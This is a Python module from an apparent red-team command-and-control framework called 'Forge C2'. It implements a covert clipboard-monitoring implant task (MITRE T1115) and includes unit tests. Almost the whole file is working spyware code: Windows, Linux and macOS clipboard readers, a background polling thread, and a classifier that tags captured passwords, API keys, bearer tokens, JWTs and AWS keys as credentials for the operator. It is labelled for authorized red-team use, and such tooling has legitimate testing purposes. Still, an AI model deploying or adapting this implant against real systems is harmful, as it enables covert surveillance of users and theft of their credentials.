"""
Forge C2 — Clipboard Monitoring Task
========================================
Capture clipboard contents at configurable intervals.

Supports:
    • Windows: ctypes OpenClipboard / GetClipboardData (CF_UNICODETEXT)
    • Linux:   xclip / xsel / wl-paste subprocess
    • macOS:   pbpaste subprocess

Features:
    • Periodic polling with configurable interval
    • Deduplication — only logs new clipboard content
    • Content type detection (text, URL, file path, potential credential)
    • Timestamped entries with source application tracking
    • Start/stop/dump lifecycle (same pattern as keylogger)

MITRE ATT&CK: T1115 — Clipboard Data
FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import collections
import logging
import platform
import re
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any

from forge_c2.tasks.base_task import (
    BaseTask, TaskResult, TaskStatus, register_task,
)

log = logging.getLogger("forge.c2.tasks.clipboard")


# ══════════════════════════════════════════════════════════════════════
#  CLIPBOARD ENTRY
# ══════════════════════════════════════════════════════════════════════

@dataclass
class ClipboardEntry:
    """A single clipboard capture."""
    content: str
    timestamp: float = field(default_factory=time.time)
    content_type: str = "text"  # text, url, filepath, credential, code
    source_window: str = ""
    content_hash: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "content": self.content[:500] + "..." if len(self.content) > 500 else self.content,
            "type": self.content_type,
            "time": datetime.fromtimestamp(
                self.timestamp, tz=timezone.utc
            ).isoformat(),
            "window": self.source_window,
            "length": len(self.content),
        }


def _classify_content(text: str) -> str:
    """Classify clipboard content by type."""
    stripped = text.strip()

    # URL pattern
    if re.match(r"https?://\S+", stripped, re.IGNORECASE):
        return "url"

    # File path patterns
    if re.match(r"[A-Z]:\\", stripped) or stripped.startswith("/") and "/" in stripped[1:]:
        return "filepath"

    # Potential credential patterns
    cred_patterns = [
        r"password\s*[:=]",
        r"api[_-]?key\s*[:=]",
        r"token\s*[:=]",
        r"secret\s*[:=]",
        r"Bearer\s+[A-Za-z0-9\-._~+/]+=*",
        r"eyJ[A-Za-z0-9\-_]+\.eyJ",  # JWT
        r"AKIA[0-9A-Z]{16}",  # AWS access key
    ]
    for pattern in cred_patterns:
        if re.search(pattern, stripped, re.IGNORECASE):
            return "credential"

    # Code-like content
    code_indicators = ["{", "}", "def ", "class ", "import ", "function ", "var ", "const "]
    if any(ind in stripped for ind in code_indicators) and "\n" in stripped:
        return "code"

    return "text"


# ══════════════════════════════════════════════════════════════════════
#  CLIPBOARD READERS (platform-specific)
# ══════════════════════════════════════════════════════════════════════

def _read_clipboard_windows() -> str:
    """Read clipboard on Windows using ctypes."""
    try:
        import ctypes

        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32

        if not user32.OpenClipboard(0):
            return ""

        try:
            # CF_UNICODETEXT = 13
            handle = user32.GetClipboardData(13)
            if not handle:
                return ""

            ptr = kernel32.GlobalLock(handle)
            if not ptr:
                return ""

            try:
                return ctypes.wstring_at(ptr)
            finally:
                kernel32.GlobalUnlock(handle)
        finally:
            user32.CloseClipboard()

    except Exception as exc:
        log.debug("Windows clipboard read failed: %s", exc)
        return ""


def _read_clipboard_linux() -> str:
    """Read clipboard on Linux via xclip, xsel, or wl-paste."""
    import subprocess

    # Try each clipboard tool in order of preference
    tools = [
        ["xclip", "-selection", "clipboard", "-o"],
        ["xsel", "--clipboard", "--output"],
        ["wl-paste"],  # Wayland
    ]

    for cmd in tools:
        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=3,
            )
            if result.returncode == 0:
                return result.stdout
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue

    return ""


def _read_clipboard_macos() -> str:
    """Read clipboard on macOS via pbpaste."""
    import subprocess
    try:
        result = subprocess.run(
            ["pbpaste"], capture_output=True, text=True, timeout=3,
        )
        return result.stdout if result.returncode == 0 else ""
    except Exception:
        return ""


def read_clipboard() -> str:
    """Cross-platform clipboard read."""
    system = platform.system()
    if system == "Windows":
        return _read_clipboard_windows()
    elif system == "Linux":
        return _read_clipboard_linux()
    elif system == "Darwin":
        return _read_clipboard_macos()
    return ""


# ══════════════════════════════════════════════════════════════════════
#  CLIPBOARD MONITOR
# ══════════════════════════════════════════════════════════════════════

class ClipboardMonitor:
    """Background clipboard polling monitor."""

    def __init__(
        self,
        interval: float = 2.0,
        max_entries: int = 5000,
    ) -> None:
        self.interval = interval
        self._entries: collections.deque[ClipboardEntry] = collections.deque(
            maxlen=max_entries,
        )
        self._lock = threading.Lock()
        self._running = False
        self._thread: threading.Thread | None = None
        self._last_hash = ""
        self._total_captured = 0

    def start(self) -> None:
        self._running = True
        self._thread = threading.Thread(target=self._poll_loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._running = False
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=5.0)

    @property
    def is_running(self) -> bool:
        return self._running

    @property
    def count(self) -> int:
        with self._lock:
            return len(self._entries)

    @property
    def total_captured(self) -> int:
        return self._total_captured

    def dump(self, clear: bool = True) -> list[ClipboardEntry]:
        with self._lock:
            items = list(self._entries)
            if clear:
                self._entries.clear()
            return items

    def _poll_loop(self) -> None:
        """Main polling loop — captures clipboard on change."""
        log.info("Clipboard monitor started (interval=%.1fs)", self.interval)

        while self._running:
            try:
                content = read_clipboard()
                if content:
                    # Dedup via hash
                    import hashlib
                    content_hash = hashlib.md5(content.encode()).hexdigest()

                    if content_hash != self._last_hash:
                        self._last_hash = content_hash
                        content_type = _classify_content(content)

                        entry = ClipboardEntry(
                            content=content,
                            content_type=content_type,
                            content_hash=content_hash,
                        )

                        with self._lock:
                            self._entries.append(entry)
                            self._total_captured += 1

                        log.debug(
                            "Clipboard capture #%d: type=%s, len=%d",
                            self._total_captured, content_type, len(content),
                        )

            except Exception as exc:
                log.debug("Clipboard poll error: %s", exc)

            time.sleep(self.interval)

    def format_output(self) -> str:
        """Format captured entries for display."""
        entries = self.dump(clear=False)
        if not entries:
            return "[No clipboard entries captured]"

        lines: list[str] = [
            f"═══ Clipboard Captures ({len(entries)} entries, "
            f"{self.total_captured} total) ═══\n",
        ]

        for i, entry in enumerate(entries, 1):
            ts = datetime.fromtimestamp(
                entry.timestamp, tz=timezone.utc,
            ).strftime("%H:%M:%S")
            type_tag = f"[{entry.content_type.upper()}]"
            preview = entry.content[:200].replace("\n", "\\n")
            if len(entry.content) > 200:
                preview += "..."

            lines.append(
                f"  #{i} [{ts}] {type_tag:14s} {preview}"
            )

        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════
#  ACTIVE MONITORS (module-level state)
# ══════════════════════════════════════════════════════════════════════

_active_monitors: dict[str, ClipboardMonitor] = {}
_monitor_lock = threading.Lock()


# ══════════════════════════════════════════════════════════════════════
#  TASK CLASS
# ══════════════════════════════════════════════════════════════════════

@register_task
class ClipboardTask(BaseTask):
    """Monitor clipboard contents at configurable intervals.

    Args (via kwargs):
        action:      "start", "stop", or "dump" (default "start").
        interval:    Polling interval in seconds (default 2.0).
        duration:    Max capture duration in seconds (default 600).
        monitor_id:  ID for this monitor instance (default "default").

    Returns:
        TaskResult with captured clipboard entries.

    Usage::

        # Start monitoring
        task = ClipboardTask(task_id="cb1", action="start", interval=1.0)
        await task.execute()

        # Dump captured entries
        task = ClipboardTask(task_id="cb2", action="dump")
        result = await task.execute()

        # Stop monitoring
        task = ClipboardTask(task_id="cb3", action="stop")
        await task.execute()

    MITRE ATT&CK: T1115 — Clipboard Data
    """

    TASK_TYPE = "clipboard"
    DESCRIPTION = "Clipboard monitoring, capture on interval"
    OPSEC_RISK = "low"
    MITRE_ID = "T1115"

    async def execute(self) -> TaskResult:
        action = self.args.get("action", "start").lower()
        monitor_id = self.args.get("monitor_id", "default")
        interval = self.args.get("interval", 2.0)
        duration = self.args.get("duration", 600)

        start = time.time()

        if action == "start":
            return self._start_monitor(monitor_id, interval, duration, start)
        elif action == "stop":
            return self._stop_monitor(monitor_id, start)
        elif action == "dump":
            return self._dump_monitor(monitor_id, start)
        else:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error=f"Unknown action: {action}. Use 'start', 'stop', or 'dump'.",
                started_at=start,
                completed_at=time.time(),
            )

    def _start_monitor(
        self, monitor_id: str, interval: float, duration: float, start: float,
    ) -> TaskResult:
        with _monitor_lock:
            if monitor_id in _active_monitors:
                return TaskResult(
                    task_id=self.task_id,
                    status=TaskStatus.FAILED,
                    error=f"Clipboard monitor '{monitor_id}' already running.",
                    started_at=start,
                    completed_at=time.time(),
                )

            monitor = ClipboardMonitor(interval=interval)
            monitor.start()
            _active_monitors[monitor_id] = monitor

        # Auto-stop timer
        if duration > 0:
            asyncio.get_event_loop().call_later(
                duration,
                lambda: self._force_stop(monitor_id),
            )

        return TaskResult(
            task_id=self.task_id,
            status=TaskStatus.COMPLETED,
            output=f"Clipboard monitor '{monitor_id}' started "
                   f"(interval={interval}s, max={duration}s)",
            started_at=start,
            completed_at=time.time(),
            metadata={
                "action": "start",
                "monitor_id": monitor_id,
                "interval": interval,
                "max_duration": duration,
                "mitre": self.MITRE_ID,
            },
        )

    def _stop_monitor(self, monitor_id: str, start: float) -> TaskResult:
        with _monitor_lock:
            monitor = _active_monitors.pop(monitor_id, None)

        if not monitor:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error=f"No active clipboard monitor '{monitor_id}'.",
                started_at=start,
                completed_at=time.time(),
            )

        monitor.stop()
        output = monitor.format_output()
        total = monitor.total_captured

        return TaskResult(
            task_id=self.task_id,
            status=TaskStatus.COMPLETED,
            output=f"Clipboard monitor '{monitor_id}' stopped. "
                   f"{total} entries captured.\n\n{output}",
            started_at=start,
            completed_at=time.time(),
            metadata={
                "action": "stop",
                "monitor_id": monitor_id,
                "total_captured": total,
                "mitre": self.MITRE_ID,
            },
        )

    def _dump_monitor(self, monitor_id: str, start: float) -> TaskResult:
        with _monitor_lock:
            monitor = _active_monitors.get(monitor_id)

        if not monitor:
            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.FAILED,
                error=f"No active clipboard monitor '{monitor_id}'.",
                started_at=start,
                completed_at=time.time(),
            )

        output = monitor.format_output()

        return TaskResult(
            task_id=self.task_id,
            status=TaskStatus.COMPLETED,
            output=output,
            started_at=start,
            completed_at=time.time(),
            metadata={
                "action": "dump",
                "monitor_id": monitor_id,
                "buffer_count": monitor.count,
                "total_captured": monitor.total_captured,
                "mitre": self.MITRE_ID,
            },
        )

    @staticmethod
    def _force_stop(monitor_id: str) -> None:
        with _monitor_lock:
            monitor = _active_monitors.pop(monitor_id, None)
        if monitor:
            monitor.stop()
            log.info("Clipboard monitor '%s' auto-stopped", monitor_id)


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestClipboardTask:
    """Tests for clipboard monitoring task."""

    def test_encode(self) -> None:
        task = ClipboardTask(task_id="cb1", action="start")
        encoded = task.encode()
        assert encoded["type"] == "clipboard"

    def test_decode(self) -> None:
        data = {"task_id": "cb2", "type": "clipboard", "args": {"action": "dump"}}
        task = ClipboardTask.decode(data)
        assert task.args["action"] == "dump"

    def test_invalid_action(self) -> None:
        import asyncio
        task = ClipboardTask(task_id="cb3", action="invalid")
        result = asyncio.get_event_loop().run_until_complete(task.execute())
        assert result.status == TaskStatus.FAILED

    def test_dump_no_monitor(self) -> None:
        import asyncio
        task = ClipboardTask(task_id="cb4", action="dump", monitor_id="ghost")
        result = asyncio.get_event_loop().run_until_complete(task.execute())
        assert result.status == TaskStatus.FAILED

    def test_classify_url(self) -> None:
        assert _classify_content("https://example.com/path") == "url"

    def test_classify_credential(self) -> None:
        assert _classify_content("password: hunter2") == "credential"
        assert _classify_content("AKIAIOSFODNN7EXAMPLE") == "credential"

    def test_classify_filepath(self) -> None:
        assert _classify_content("C:\\Windows\\System32\\cmd.exe") == "filepath"
        assert _classify_content("/etc/passwd") == "filepath"

    def test_classify_text(self) -> None:
        assert _classify_content("just some regular text") == "text"

    def test_entry_to_dict(self) -> None:
        entry = ClipboardEntry(content="test data", content_type="text")
        d = entry.to_dict()
        assert d["content"] == "test data"
        assert d["type"] == "text"

    def test_monitor_lifecycle(self) -> None:
        monitor = ClipboardMonitor(interval=10.0)
        assert monitor.count == 0
        assert monitor.total_captured == 0
        assert not monitor.is_running
